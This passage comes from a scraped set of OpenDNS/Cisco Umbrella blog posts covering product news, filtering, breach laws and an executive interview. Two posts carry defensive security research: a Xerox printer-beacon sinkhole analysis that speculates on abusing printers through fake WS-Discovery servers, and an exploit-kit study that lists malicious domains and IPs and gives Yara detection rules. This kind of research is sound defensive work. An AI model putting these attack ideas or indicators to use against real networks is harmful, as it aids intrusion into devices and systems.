standard and they can offer their customers the ability to use ANY or ALL services. That’s a huge win for software developers. There’s already a healthy list of software that can send updates to DNS-O-Matic. The list will grow quickly; let us know if you have an addition. Third : Dynamic DNS service providers (like DynDNS , No-IP , ChangeIP , etc.) now benefit from increased distribution. As DNS-O-Matic support spreads, all the supported services become available to new customers without any effort. OpenDNS will add new services to that list as requested. More importantly, new services have an immediate user-base from which to offer their service. There is a lot of opportunity for applications to take advantage of DNS-O-Matic. Everything from your Slingbox to your Xbox 360 could use DNS-O-Matic and make it easier to manage network devices at home or at work. Supporting new services is easy During the private beta, a DNS-O-Matic user suggested we add support for the BroadbandReports.com Line Monitoring service. We hadn’t heard of this worthwhile service before but adding support for it in DNS-O-Matic took about 30 minutes and was immediately available to every DNS-O-Matic user. Thanks are in order… During the building of DNS-O-Matic, we’ve been thrilled to have the support of so many individuals and companies in the DNS world. DNS-O-Matic helps make services easier to use and businesses easier to operate because complementary (and even competitive) businesses are working together. Our thanks to the many developers and service providers we’ve spoken to recently: we look forward to more collaboration. We’re also grateful to our beta testers. Why DNS-O-Matic? Oh, and the name DNS-O-Matic? We chose that name because it’s fun to say and memorable. It’s also a hat tip to Ping-O-Matic , a service from some of the lead developers of WordPress for redistributing blog update notifications to dozens of services. It’s simple, free and stable — three attributes we respect a lot in a great service and will uphold with ours. Finally You can learn more in the DNS-O-Matic FAQ . The OpenDNS knowledge base has more information on Internet Protocol (IP) addresses and an explanation of dynamic IP addresses. Let us know what you think!", "date": "2007-12-02"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Open Sources Autotask Web Service API Client", "author": ["Eric Reynolds"], "link": "https://umbrella.cisco.com/blog/opendns-open-sources-autotask-web-service-api-client", "abstract": "Here at OpenDNS, we have a variety of customers–from Fortune 500 companies to parents who are looking to protect their children from unsavory websites. A special and important part of our customer base, Managed Service Providers (MSPs), provide proactive IT services to small and medium businesses (SMBs). MSPs provide a full suite of IT services from data backup and security, to being a company’s virtual CIO. Unlike traditional hourly contractors, MSPs offer an all-inclusive subscription service without extra costs for repairs. Enter OpenDNS Umbrella’s cloud delivered security model. A MSP can leverage Umbrella’s predictive security to prevent customer infections and drastically reduce the need for manual malware cleanups. This makes for happier customers and decreases their cost per customer. A perfect fit. MSPs use Professional Services Automation tools, or PSAs, to manage their customers, keep track of billing, and monitor service requests (among other things). These partners are very important to us, and we have a dedicated engineering team to implement new features to help improve their bottom line. In November 2013, we announced our integration with ConnectWise, one of the major PSAs. We are proud to now provide an integration with Autotask, the other popular PSA. The Autotask integration is currently in limited availability, and will be released soon. While designing our integration with Autotask, we found that many MSPs use PHP to write both simple scripts and complex applications. The Autotask documentation is very verbose and well written, but the examples (written in VB.NET) do not work as expected using SOAPClient in PHP. Today we are open sourcing our Autotask Web Service API client. It can be found in the OpenDNS GitHub repository , and has been registered on Packagist for installation via Composer. Our goal is to help MSPs, and any other company integrating with Autotask, to get up and running quickly. If you find any bugs, or wish to make improvements, please file an issue , or fork our repository and open a pull request.", "date": "2014-06-30"},
{"website": "Cisco-Umbrella", "title": "1 in 3 K-12 Schools uses OpenDNS. Know one of them?", "author": ["Allison Rhodes"], "link": "https://umbrella.cisco.com/blog/1-in-3-k-12-schools-uses-opendns-know-one-of-them", "abstract": "Today we announced that one in every three public grade schools in the US is using OpenDNS. One in every three. This news just a couple months after we shared that 1% of all Internet users in the world are running OpenDNS. Why is it significant that more than 30% of all US K-12 public schools are using OpenDNS? Because schools are held to the highest standard when it comes to keeping the Internet safe, and it’s a task that network admins at schools don’t take lightly. Yet at the same time, they’re often given very small budgets for technology and, unfortunately, purchasing and maintaining a content filtering appliance can eat up that budget fast. OpenDNS provides content filtering delivered through the cloud, with no appliances to mess with, and in many cases saves tens of thousands of dollars per year. We saw lots of adoption among K-12 schools and school districts early on, and it’s only become stronger over time. Today we’re proud to report that the largest school districts in the US trust OpenDNS, including Baltimore City Schools, Detroit Public Schools and San Diego Unified School District — to name just a few. Chances are, a school district near you is using OpenDNS, too. Know a school district that isn’t using OpenDNS yet? Do you run the network for a school but aren’t using OpenDNS there yet? Read up on web filtering, CIPA compliance and internet security for K-12 schools . Have a question? We’re all ears. Oh and psst — special summer pricing on OpenDNS Enterprise just for K-12 schools.", "date": "2010-06-08"},
{"website": "Cisco-Umbrella", "title": "OpenDNS's Free Parental Controls Protects Your iPads, Kindles, and mobile devices too!", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/opendnss-free-parental-controls-protects-your-ipads-kindles-and-mobile-devices-too", "abstract": "Gadgets proved especially popular in my family this past holiday season, as I’m sure it did for many others. My brother got an Xbox 360, while my mom loved her new Kindle Fire. Meanwhile, friends of mine around the office unwrapped their new iPads, Android tablets, and smartphones. Some folks may be looking to add some parental controls to these devices: you might be looking to block adult content on your iPad if you got one for your family this season. I’m happy to report that, no matter what new Internet-connected device you added to your network this season, OpenDNS can protect it. Best of all, there’s no additional software to install, and it’s completely free. If you can use the device to surf the web, we can protect it while it’s connected to your home’s wi-fi network. Of course, you’ll get the other benefits of OpenDNS’s Free Parental Controls too, regardless of whether or not you choose to enable Web filtering: phishing protection, and an overall safer, faster, smarter and more reliable connection. While I don’t need to set up any parental controls on my mom’s new tablet, I’m sure she’ll appreciate the added phishing protection. 🙂 To add parental controls to your iPad, iPhone, Wii, Kindle Fire, Android tablet, or other device on your home network, you just need to set up OpenDNS on your home router . If you already have, you should be seeing the benefits automatically, without any additional configuration. One small caveat, though: if you’re looking to add OpenDNS’s Free Parental Controls to your Amazon Kindle Fire, you’ll need to disable the accelerated Web browsing for it to work (but don’t worry — OpenDNS speeds up websites, too!).", "date": "2012-01-12"},
{"website": "Cisco-Umbrella", "title": "Xerox Printer Beacons And The Importance of Documentation", "author": ["Andrew Hay"], "link": "https://umbrella.cisco.com/blog/xerox-printer-beacons", "abstract": "The old adage of “measure twice, cut once” is solid advice that is often ignored in the digital world. We at OpenDNS, however, believe that when talking about IP-enabled devices, a new and more targeted adage should be followed: “Read [the documentation] twice, connect [the device] once.” – Andrew Hay Here’s why. We all live busy lives. So busy, in fact, that many believe that computer printers haven’t really changed much over the years to warrant reading the instructions. Sure, many newer models can be connected to your local network but that’s only for internal network connectivity, right? Unfortunately, that is not the case. The Discovery While conducting some research, we happened to notice a rather odd domain name that a particular server was beaconing out to. The domain in question was xeroxdiscoverysupernode3.com . Initially, we figured that the domain could be malware or phishing related as the likelihood of Xerox Corporation using such a long domain was relatively low. Upon further investigation, the xeroxdiscoverysupernode3 domain wasn’t even registered. Could a piece of malware have been constructed to call out to this specific domain to download additional files? Why wouldn’t the malware author register the domain ahead of time if that was the plan? As this domain ended in the number 3, we pondered the idea of there being a ‘1’, ‘2’, or maybe even a ‘4’ numbered domain that followed this same pattern. It turned out that xeroxdiscoverysupernode1, xeroxdiscoverysupernode2, and xeroxdiscoverysupernode3 were actively being queried for within the OpenDNS global infrastructure. Not only were the domains being queried, but each was receiving roughly 2,000 queries per hour (as seen below). The plot thickens. We began searching Google for the domains in question by using the following search string: https://www.google.com/search?hl=en&as_q=xeroxdiscoverysupernode1+xeroxdiscoverysupernode2+xeroxdiscoverysupernode3 Without much difficulty we were able to find several official Xerox documents that detailed the purpose of the domains. The Xerox® WorkCentre® 5845/5855/5865/5875/5890 System Administrator Guide talks about the McAfee Embedded Control features that provides 2 specific security functions: 1) Enhanced Security maintains the integrity of printer software by monitoring system files and alerting you if an unauthorized change is made to a system file. 2) Integrity Control is a software option that combines enhanced security features with the ability to monitor and prevent unauthorized executable files from running. Enable this option by providing a feature installation key on the Feature Installation page. Deeper into the documentation, we noticed a section entitled Designating Printers as Super Nodes. According to the documentation, the “Xerox® extension for McAfee [ePolicy Orchestrator] ePO uses up to three Xerox® printers as supernodes to communicate with the other Xerox® printers that it monitors. Xerox recommends that you designate more than one Xerox® printer as a supernode. If one supernode is not functioning or is offline, McAfee ePO can use the other supernodes to communicate with other printers. You designate printers as supernodes by adding specific entries to your DNS server.” The section continues to state that “Your Xerox® printers and your McAfee ePO server must use the same DNS server.” The first mention of the suspicious domains shows up in the Adding DNS Entries to One or More Existing Domains section. It states: If you have a small number of domains in your network, use this method to add DNS entries to each domain. On your DNS server, find the domain of each printer that you want to designate as a supernode. For each domain, add entries for all supernodes, then name them: – XeroxDiscoverySuperNode1 – XeroxDiscoverySuperNode2 – XeroxDiscoverySuperNode3 If your network uses more than one DNS server, repeat the previous step for all other DNS servers. If you have a large number of domains in your network, use this method to add DNS entries to a single  domain. On your DNS server, create a domain named Xerox.local. The Xerox extension for McAfee ePO looks for a domain with this name. For Xerox.local, add entries for each supernode, then name them: – XeroxDiscoverySuperNode1 – XeroxDiscoverySuperNode2 – XeroxDiscoverySuperNode3 Note that it doesn’t say xeroxdiscoverysupernode[1-3].com, just the domain without the TLD. It should also be noted that neither Xerox, nor McAfee, show any results for a ‘xeroxdiscoverysupernode’ query on their respective sites: – http://www.xerox.com/search?q=xeroxdiscoverysupernode – http://www.mcafee.com/apps/search/default.aspx?region=us&q=xeroxdiscoverysupernode&searchSubmit=Go Looking at the OpenDNS query traffic for April 17 through April 20, 2014 (inclusive) we were able to identify 142 unique hostnames attempting to query the three xeroxdiscoverysupernode domains. A map indicating the approximate host geolocations can be seen below. The Domains and The External Sinkhole Further Google searches also lead us to Internet Corporation for Assigned Names and Numbers (ICANN) List of rSecond-Level Domains (SLDs) to Block list which expressly calls out the three suspicious domains. In an effort to proactively deny the use of these domains by potentially malicious users, we registered the 3 domains and pointed them at a VPS. This server acted as an external sinkhole of sorts for all public queries to the xeroxdiscoverysupernode[1-3].com domains. On the external sinkhole we ran several packet captures using tcpdump to identify some ports associated with Xerox printers. With our port samples we went back to the Xerox documentation. The port that jumped out almost immediately was port 3702. Unfortunately, the information about the port was quite limited in the Xerox® WorkCentre® 5845/5855/5865/5875/5890 System Administrator Guide – stating only that it was “WS-Discovery (UDP port 3702)”. As we were seeing both TCP and UDP on this particular port, back to Google we went looking for keywords like “xerox+3702+tcp+udp filetype:pdf”. It wasn’t long before we found  38,900 results. The most descriptive was the Xerox WorkCentre™ 7525/7530/7535/7545/7556 Information Assurance Disclosure Paper Version 1.1 document which stated: 2.8.2.21. Port 3702, WSD Discovery, WS Discovery Multicast This is the default port for WS-Discovery (the discovery of services in an ad hoc network with a minimum of networking services (for example, no DNS, UDDI or other directory services). It does this by announcing or advertising the existence of the printer and its services on the network when it becomes available, and announcing its departure when unavailable. The default state is selected (enabled) . ( Note: emphasis added ) Further investigations on the WS-Discovery protocol led me to several sites which described the protocol, including: – WS-Discovery From Wikipedia, the free encyclopedia , – Windows 2003 Web Services Dynamic Discovery (WS-Discovery) – OASIS Web Services Dynamic Discovery (WS-Discovery) Version 1.1 It looked as though we had found what we were looking for. To monitor the traffic more easily, we installed ntopng to get a sense of just how many queries were being made. As you can see from the cumulative stats below, quite a bit of traffic was heading towards the server. Analysis of the domains shows 327 unique hosts querying the external sinkhole. The map on the left shows the OpenDNS queries and the right-hand side shows the external sinkhole queries. The combination of both OpenDNS client queries and the external sinkhole queries results in 422 unique hosts. The map below shows the cumulative hosts. The OpenDNS Sinkhole At this point we decided to sinkhole the domains for OpenDNS customers and monitor the queries. The internal sinkhole showed SOAP queries that resembled the following: {\n \"dport\": 3702,\n \"ip_src\": \"a.b.c.d\",\n \"payload\": \"POST / HTTP/1.1rnHost: 54.193.55.93:3702rnUser-Agent: gSOAP/2.8rnContent-Type: application/soap+xml; charset=utf-8; action=\"http://schemas.xmlsoap.org/ws/2005/04/discovery/Hello\"rnContent-Length: 2268rnConnection: closernSOAPAction: \"http://schemas.xmlsoap.org/ws/2005/04/discovery/Hello\"rnrn n<wsa\",\n \"ts\": 1398203136\n} The SOAP requests confirmed that port 3702 queries were, in fact, WSD queries. It would be a trivial exercise to write a client to interact with this request as the protocol information is freely available and relatively easy to understand (see the external presentation below). Web Services Discovery for Devices from Jorgen Thelin Setting up a ‘fake’ WSD server could potentially allow a malicious user to do any number of things from sending print jobs to printers to tie up resources, pushing down customized drivers to allow further access, or even something as simple as reseting the devices back to factory defaults to deny people access to the devices. Alex Stamos , formally of iSec Partners and now the CISO of Yahoo!, had a fantastic presentation entitled Attacking Web Services: The Next Generation of Vulnerable Enterprise Applications that he presented at CanSecWest in 2006 that provided quite a bit of background on how web services could be exploited. It is entirely possible that someone has already attempted to perform some form of malicious act using these super node domain names. Looking at OpenDNS Investigate we can see that the xeroxdiscoverysupernode3.com domain has a co-occurrence with a suspicious looking domain (seen below): As presented in Frank Denis’ blog post , the infection chain for serving a single piece of malware is frequently made of many, constantly-changing domains. The security community finds thousands of new sites serving malware or acting as intermediaries every day. Hosts used to control botnets are also constantly changing in order to be resilient to takedowns. The cizjvdm…qsyd.biz domain has a very high DGA score which is indicative of a domain that was randomly generated by an algorithm. Another observation is that the domain in question has co-occurrences with other DGAs which could indicate a malicious campaign of some sort. Interesting, but not yet conclusive. Further investigation by the OpenDNS Security Labs on these domains may shed some light on the campaign objectives. Who is affected? We do not want to implicate the individual companies observed but we did, however, want to provide a breakdown of the vertical industries represented in the traffic: – Automotive – Consumer – Engineering – Energy – Oil and Gas – Fast-Moving Consumer Goods (FMCG) – Food and beverage – Healthcare – Insurance – Manufacturing – Retail – Technology – Telecommunications There were also 5 companies listed in the Fortune 500 which means that this issue is not isolated to organizations of any size or security program maturity level. As stated previously, OpenDNS has added the xeroxdiscoverysupernode[1-3].com domains to our sinkhole server, providing protection for all users of our DNS service (both free and paid). We will also continue to operate the external sinkhole for the time being but may opt to forward the queries for the super node domains to a dead IP instead of an actual live server. This would prevent anyone from using the super node domains for malicious purposes. Had we not registered the domains and/or sinkholed the traffic, it’s entirely possible that a malicious actor could have exploited this threat vector to gain access to numerous printers, and potentially internal networks,  around the world. So what are the next steps? Beaconing of this nature could serve to alert a potential attacker to the technology assets within your organization (or home). Do you really need the world to know that you’re using a specific brand of printer? Probably not. At an absolute minimum, you should add these domain names to your internal DNS servers to ensure that future queries never leave your network. You may also want to add firewall and/or IPS rules to block domain-level access to the super node domains. For individuals or organizations with any IP-enabled  devices, from printers to scanners to wireless access points, OpenDNS highly recommends that you allocate time to review the documentation, configuration settings, and software/firmware version. For existing devices, a frequent review process should exist as part of the device lifecycle management policy and device-specific procedure. For new devices…read the documentation twice, connect the device once! Never put anything on your corporate or home network without first understanding its expected behavior. This threat vector would not exist if documentation was read carefully and devices were not carelessly introduced into corporate and home networks. We hope you have found this post educational. Thanks for reading! Photo Credit: Truthout.org via Compfight cc", "date": "2014-05-01"},
{"website": "Cisco-Umbrella", "title": "Details on exploit kits, as told by the Umbrella Security Graph", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/a-quick-look-at-domains-used-for-exploit-kits", "abstract": "The Umbrella Security Labs combines our proprietary research tool the Umbrella Security Graph (Sgraph) with various investigative methods and backend predictive algorithms and classifiers to uncover new sets of suspicious and malicious domains each day. We leverage these technologies to discover domains before they are used in the wild, with the goal of ensuring that customers using Cisco Umbrella receive the best protection possible. But given the lofty nature of this claim, we also seek to expose our research and findings so that it’s clear how we accomplish these goals. For example, in a previous post, we explored the relationships between dynamic DNS domains and malware sites. In this blog, we look at sample malicious URLs to determine the most frequently used exploit kits, and discuss some of the notable features of these URLs’ domains. An Overview of Exploit Kits Exploit kits are an extremely efficient and popular way of distributing malware to gain control of people’s computers. Let’s quickly review how exploit kits work: First, a user’s traffic is redirected to a server that runs an exploit kit Web application. Then, the kit detects existing vulnerabilities in the software or operating system running on the user’s machine. The kit exploits these vulnerabilities by stealthily dropping a malware payload (directly or via further redirections) on the user’s computer. As a result, the attacker takes over the user’s machine. The ecosystem of exploit kits is quite vast, and these kits can differ technically or with regard to their business model. A good poster showing the common exploit kits of 2012 is available on deependresearch.org . [Exploit kits poster published on http://www.deependresearch.org/2012/11/common-exploit-kits-2012-poster.html] An Umbrella Security Labs Exploit Kit Study To perform a study on how exploit kits are behaving, we take random samples of malicious URLs from our database for a period of 7 days, and use Yara (more on the tool at the end of this post) rules to detect known exploit kits URLs and report the percentage of URLs for each exploit kit. We also analyze the domains of the URLs for any noticeable features. In the figure above, we see the top 3 most frequent exploit kits in the URL samples. As expected, Blackhole is the most prevalent followed by Red kit, then Safepack. We then take as an example, the URLs that are related to Blackhole and further investigate their domains using the Umbrella Security Graph (Sgraph). For the example domain dfudont[.]ru, Sgraph shows in the figure below that it is fastflux, hosted on an ASN with a suspicious score, has a low C-Rank and that the domain has been assigned a low score by our classifier. Details on a Sample of Blackhole Domains Domains such as jindalo[.]ru, ijsiokolo[.]ru, ifikangloo[.]ru, ejjiipprr[.]ru, and dfudont[.]ru, are detected as fastflux and registered in January-April 2013. One of our predictive algorithms detects fastflux domains daily. These domains are often registered recently then start triggering DNS traffic. The domain ehrap[.]net is registered on May 2nd, and stays dormant for 5 days. It starts being DNS-active on May 7 and our fastflux detection system catches it on that day, which is also the same day it begins delivering malware in a fake Amazon spam campaign . On May 8, we catch the domain nilokwe[.]pw as fastflux, which is the same day it is registered. On May 9, we detect the domain pinformer[.]net as fastflux. The three domains ehrap[.]net, nilokwe[.]pw, pinformer[.]net are all Blackhole related domains as urlquery reports it (click on the domain name to see the urlquery report). Furthermore, as of May 8, the three domains ehrap[.]net, nilokwe[.]pw, and pinformer[.]net use the same name server(s): ns1[.]recorderbooks[.]net and ns2[.]recorderbooks[.]net. ns[1-2].recorderbooks[.]net also serve as name servers for nopfrog[.]pw. This domain was registered on May 4, stayed dormant, then started activity as a Blackhole domain on May 9-10. We spotted it at the same time via its name server association with fastflux Blackhole domains. justcollega[.]net is hosted on 37.59.215.18. This IP is hosting several other known malicious domains, and others not yet flagged as malicious. Some of the latter domains were registered in early May, e.g. ksufsdkjvbdskvsdkvsdv[.]com on May 2, justcollega[.]com on May 4, burnbug[.]net on May 5, zohoretail[.]biz on May 5, and contasesso[.]net on May 6. These domains are suspicious and justify that we block them or quarantine them. Several known Blackhole related domains are hosted on the same IPs, as the figure below shows (from the studied sample). One such IPs is 37.230.116.89. This IP hosts other domains, and similarly several are registered recently. For example, kawsedrol[.]us, kawsedrol[.]info, kawsedrol[.]biz, qertroli[.]us, qertroli[.]info, polkawsed[.]org, polkawsed[.]info are all registered on May 1st 2013. Some of these domains already have known subdomains hosting or redirecting to malware. This justifies that we block the 2LDs. More Details on Yara, the Tool for Our Study Yara is a malware identification and classification tool that is fast at detecting textual patterns in URL samples. One can use known regular expressions of exploit kits’ URLs as rules and fire up the Yara engine to see which URLs match the rules. For example, a known string rule for detecting certain Blackhole URLs looks like: rule blackhole : exploit_kit { strings: $a = /.php?.*?:[a-zA-Z0-9:]{6,}&.*?&/ condition: $a } Another rule for detecting certain Red kit URLs used for dropping malware payloads looks like: rule redkit_bin : exploit_kit { strings: $a = //d{2}.htmls/ condition: $a }", "date": "2013-05-17"},
{"website": "Cisco-Umbrella", "title": "Data Breach Laws: What Security Professionals Need To Know", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/data-breach-laws-security-professionals-need-know", "abstract": "According to David Inserra , a research associate in The Heritage Foundation’s Allison Center for Foreign and National Security Policy and Paul Rosenzweig, former Deputy Assistant Secretary for Policy in the Department of Homeland Security, the high-profile onslaught of private-sector security breaches over the past few years warranted legislation to improve the country’s cyber security posture. In an article on cybersecurity regulation posted last fall, Inserra and Rosenzweig pointed out that the government itself also was hit with its own less publicized cybersecurity breaches and failures – 23 separate incidents across several different agencies in 2013 and 2014. Fast forward and following this year’s State of the Union address, President Obama in fact did outline new legislation that will determine when and how consumers and businesses are informed about data breaches that expose their personally identifiable information (PII). As recent as last week, two more bills covering data breach notification were reintroduced into the House and Senate. In both cases, the federal legislation would replace what was described as a “patchwork” of existing state data breach notification laws. Now that the cards are falling where they may, what do businesses need to know about this proposed legislation? Proposed Federal Laws: How They Could Impact Your Business The proposed legislation’s effectiveness is debatable, as well as the potential impact on consumer privacy. But as a practical matter, what do these laws mean for your business? Below, we’ve summarized several analyses and commentaries on the proposed legislation, collected over the past two weeks. Would every company be affected by the proposed bill? The proposed legislation would not affect non-government contracted businesses that collect records on less than 10,000 individuals in the course of a year. Also, if your company stores health care information, you are already subject to The Health Insurance Portability and Accountability Act (HIPAA) Privacy Rule and other rules that govern health records . However, several states’ attorneys general have said companies that hold health care information not currently under HIPAA would no longer be affected by state data breach laws that currently dictate a notification timeline. How will notification laws change? The proposed legislation provides for a 30 day window for notification to consumers. One major change, however, is the law also requires businesses to notify the media when a breach exposes the PII for more than 5,000 individuals. How would this affect my work as a security professional? The proposed federal law allows for a risk assessment to prove that, despite data theft or loss, “there is no reasonable risk that a security risk has resulted in, or will result in, harm to the individuals whose sensitive personally identifiable information was subject to the security breach.” Existing State Laws: Preparing for the Worst Case Scenario The 2014 Verizon Data Breach Investigation Report (DBIR) lists over 1,367 confirmed data breaches over a one-year period. Any company operating in multiple states would have to navigate dozens of wildly different laws to determine when, why, and if customers should be notified. Additionally, dozens of legal websites summarize data breach notification laws state-by-state ( here’s one example ). These sites can give you a starting point to understanding existing laws, but they’re no substitute for actual legal counsel. To put the issue into perspective, this Bureau of National Affairs article outlines the dizzying variety of “personally-identifiable information” as defined in state law–some states include insurance information, others biometric data, and still others include login credentials and passwords. Tom Hash, director of security engineering at OpenDNS, concurs that these laws can be very difficult for security experts to track. “[Security professionals] are faced with 47 different state laws that can change when they’re not paying attention,” he said. “In some cases, the companies I talk to end up having to figure out their notification guidelines under these laws after the breach has happened.” Many security professionals already plan for the worst possible scenario. This means assuming they will have to respond in the tightest notification time-frame (Connecticut’s five days to notify regulators or Maine’s seven days to notify consumers) and under the most stringent definition of PII provided in any applicable state law. Professionals should also account for special circumstances, like California, where the law applies to any company storing a state citizen’s data, even if the business does not operate within that state. The Bottom Line While the Personal Data Notification & Protection Act is not yet actual law, it is imperative that companies prepare for it or another law that may be very similar. Such preparation requires a huge collaborative effort between your company’s IT department, security team, marketing team, and legal counsel. It is a good idea to lay out an internal and external communication and action plan, and put those plans into practice.", "date": "2015-02-09"},
{"website": "Cisco-Umbrella", "title": "Your questions answered: Ensuring Appropriate Use on Guest or Public Wi-Fi", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/your-questions-answered-ensuring-appropriate-use-on-guest-or-public-wi-fi", "abstract": "Providing Wi-Fi access for employees and guests has become a business essential. For many, public Wi-Fi access is accompanied by the need for an acceptable use policy, whether to limit bandwidth consumption or create a family friendly environment. The evolution of Wi-Fi hardware has made it easier to deploy and manage wireless access, but more difficult to rely on traditional Secure Web Gateways for Web filtering. At a recent webcast, we shared how Umbrella Hotspot Edition, a lightweight cloud-based Web filtering solution, solves that problem. Not only is enforcing acceptable use through the cloud easier, it can also eliminate performance issues and reduce administrative overhead. We had more questions during the webcast than we had time to answer, so I sat down with OpenDNS product manager Dima Kumets to get some additional insight. Below are the top five most-asked questions from the webcast. 1. How does Umbrella Hotspot Edition enforce acceptable use on all devices that connect to our company’s Wi-Fi network? DNS is an essential Internet protocol that is used in every single Internet connection. When users ask to connect to Amazon.com while in your store, for example, you can use DNS to return that request with either the website itself, or a block page. Since DNS is used by all devices, from laptops and tablets to iPhones and Androids, it’s automatically enforcing policy when these devices are connected to Wi-Fi. 2. How do you prevent guests from bypassing the service by using other DNS/ports/VPN? Occasionally a user will try to bypass the Umbrella Web filtering service by switching their DNS to another provider. This can easily be prevented by setting your router to block all port 53 traffic except traffic going to the OpenDNS resolvers. Umbrella also features a Proxy/Anonymizer category in the Content Filtering settings, which will block further attempts to bypass your appropriate use policy. 3. Does this work with all Wi-Fi access points? Yes, Umbrella Hotspot Edition can be used with all Wi-Fi access points. The cloud-based delivery mechanism allows seamless and swift deployment – imagine the ability to deploy Web-filtering to every one of your hotspots in just one day, without having to leave the office. That’s the power of cloud-delivered security. To make Umbrella deployment even easier, OpenDNS has partnered with both Aruba and Cradlepoint; we’ve integrated our management center into their standard interface, allowing you to save time by covering everything from one centralized dashboard. 4. Can this also work for an enterprise’s guest Wi-Fi or is it just for public Wi-Fi? Umbrella Hotspot Edition is built specifically for guest and public Wi-Fi deployments – the effortless implementation, minimal administrative overhead, and low cost make it an ideal solution for the retail and hospitality industries, especially those with numerous locations. In addition, enforcing the same rules for both guests and employees is often a recipe for disaster – one side or another won’t be getting the policy they need. To ensure all parties have the appropriate level of filtering, consider using Umbrella Enterprise for your internal networks. 5. What does the process look like to get started on a trial? Getting started on a free trial is easy , since Umbrella is a cloud-delivered service and you don’t actually have to install or download anything. A quick chat with one of our reps, and a simple configuration change in your DNS settings, and you can be up and running!", "date": "2013-06-26"},
{"website": "Cisco-Umbrella", "title": "Cheat sheet: Appliance vs. Cloud-Delivered Internet Security", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/cheat-sheet-appliance-vs-cloud-delivered-internet-security", "abstract": "The new year is a great time to kick off fresh IT projects or resolve to improve the state of your networks. For some of you, that may include refreshing your Internet security program. Businesses, schools and governments are gaining confidence in cloud security at a rapid pace, and Internet security companies are adding a growing number of cloud-delivered malware protection and Web filtering offerings, so you might be asking if cloud-delivered security is right for your business. To ease the decision process, we compiled this cheat-sheet for evaluating appliance and cloud-delivered Internet security solutions. We looked at five essential parameters for comparison: efficacy, mobility, scalability, reliability and manageability. In each category, we compared appliance-delivered security solutions, or Secure Web Gateways, with cloud-delivered security solutions, or Secure Cloud Gateways, that provide malware protection and Web filtering. The Umbrella whitepaper, A five-point analysis of appliance vs. cloud-delivered security , expands the summary you see above to answer your toughest questions about Internet security delivery platforms. Download the whitepaper now to get all the details.", "date": "2013-01-04"},
{"website": "Cisco-Umbrella", "title": "New OpenDNS VP Sees Common Threads Linking Company and London Tech Community", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/opendns-emea-launch", "abstract": "Today marks the official debut of OpenDNS’s new EMEA (Europe, the Middle East and Africa) headquarters. But despite the fact that the company is a newcomer to the United Kingdom, new EMEA VP Andre Stewart says he has good reason to believe that OpenDNS will be right at home in the heart of London. Although the connection may not be immediately obvious, Stewart says that The City and the cloud-delivered security company have both been defined by a love of innovation and comfort with fast-paced growth in recent years. He believes that these qualities make OpenDNS a good fit for not only London, but the rest of EMEA, as well. Journey to OpenDNS Stewart has had a long and successful career with some of the world’s leading enterprise security and networking vendors. But his path to that early success was both unconventional and illuminating for someone who would later oversee hundreds of millions of dollars in sales across Europe. “After the dotcom bust, I was part of a cross-border channel M&A business,” said Stewart. “It was mostly resellers and distributors working in the communications sector. The companies I was working with ended up becoming [major channel companies] Telindus, Dimension Data, Westcon, Logicalis and Articon Integralis [now NTT Com Security].” Stewart explains that many European customers have very strong relationships with their partners, making these channel players a key target demographic for technology vendors looking to break into Europe. With his expertise, opportunity quickly came knocking in the form of NetScreen, one of the world’s first hardware network security companies. “NetScreen was the first company to put software into hardware and create network security appliances,” said Stewart. Early employees of NetScreen and OneSecure (a company acquired by NetScreen in 2002) went on to found Palo Alto Networks and Fortinet, companies which continue to dominate in the next-generation firewall and unified threat management space today. While helping NetScreen navigate the market opportunity in Europe, Stewart saw firsthand the opportunity — and challenges — of the network security market. “That was the beginning of network security,” he said. “Before that, there were only really antivirus and content filtering solutions. In the mid 2000s is when I think we first started talking about cybercriminals, and what they were doing. The industry had to educate people on just how big the opportunity was, what the market potential was and what problems we were addressing.” “Even though there were early breaches, there were actually very few people at the time paying attention to new developments in security. It’s only been recently, in the last 24 months or so, that we have seen people outside of the industry talking about cybercrime and cyberterrorism. It’s only very recently that most people understand that they have been affected,” he said. Later, Stewart moved on to senior leadership positions at Corero, Fortinet, and finally A10 Networks. “When I was at Fortinet in France, sales grew from nothing to over $100 million over six years… and that offering wasn’t as exciting as OpenDNS,” he said. Kindred Spirits Between OpenDNS, Londoners But what makes OpenDNS exciting? Why did he choose to join the company? Stewart says that it’s a combination of the company’s business model, past history and future promise that hold up well when compared with the forces that are shaping today’s security needs in the enterprise. “The way that the world is going, there are three high growth areas that are really interesting: preventing cybercrime, Big Data/analytics and cloud-provided services,” he said. “The thing is, OpenDNS is one of the few companies that can credibly say it does all three of those, and that’s very interesting.” “We also have an infrastructure that’s for real. It’s extremely robust and has been working since 2007,” said Stewart. “That’s incredible. Infrastructure is a major barrier to entry for other companies. If you look around and you see some of these startups from Silicon Valley and elsewhere, they may be very well-funded, but few of them are approaching OpenDNS’s kind of performance. OpenDNS has a massive amount of data that we’re ingesting every second and from that we have the infrastructure to produce intelligence on what’s good and what’s bad on the fly.” “Finally, dealing with so much data per second and then coming out with intelligence on the back of it is quite unique in the market,” he said. “With these capabilities and proprietary data, you can interest high-end customers in any vertical as well as providing the same quality service to SMEs.” Stewart also sees the company’s growth potential as a boon for customers. “It almost reminds me of the early days of Yahoo! and Google; the more people that used their services, the more accurate their searches became.” He added that OpenDNS’s threat intelligence collection methods are not intrusive, unlike companies that target end users for advertising. “With OpenDNS, the more companies that deploy it, the better the intelligence is. It’s a virtuous cycle,” he said. Stewart sees a similar cycle powering the booming economy that has defined London’s character in recent years. “Why did we choose London? It’s really based on the fact that London is an extremely dynamic, growth environment,” he said. “More and more entrepreneurs are coming to London and starting their businesses here than other European countries. A lot of the young talent, and even the older talent, are coming to London because there is employment and investment here. People in Spain, France, Italy, Greece–the people who are leaving university in these countries, instead of staying in a local capital are coming to London. All of that means more people in London. More buzz, more restaurants, more buildings, more work and a bigger economy. It’s an upwards cycle.” Security, and Solutions, without Borders Despite these similarities, Stewart says that OpenDNS’s solution is uniquely broad, and that it can bring value to the specific security challenges facing companies throughout Europe and the rest of the region. “We’re starting from London, but the whole European market can benefit from OpenDNS,” he said. “Whether it’s countries like Italy that have lots of very small companies, to countries like Germany that have lots of middle sized companies or France with a lot of big companies — it doesn’t matter. Everybody can benefit from our solution.” Stewart says that the company initially plans to establish itself in London, and then 